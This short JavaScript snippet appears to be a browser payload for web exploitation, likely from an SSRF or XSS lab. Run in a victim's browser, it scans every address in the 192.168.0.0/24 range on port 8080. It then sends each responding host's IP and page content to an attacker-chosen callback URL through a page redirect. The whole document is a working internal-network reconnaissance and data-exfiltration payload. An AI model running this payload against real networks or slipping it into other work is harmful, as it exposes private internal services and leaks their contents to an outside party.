// This javascript would help in scanning an entire /24 subnet (255 ips)

var q=[], callUrl='';
for (i=1;i<=255;i++){
	q.push(function(url)
     	{
  		return function(wait){fetchUrl(url,wait);}
  		}('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}

// This function helps in performing API calls
function fetchUrl(url,wait){
var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = callUrl+'?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  })).catch(e => {
  if(q.length) {
    q.shift()(wait);
  }});
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
 }
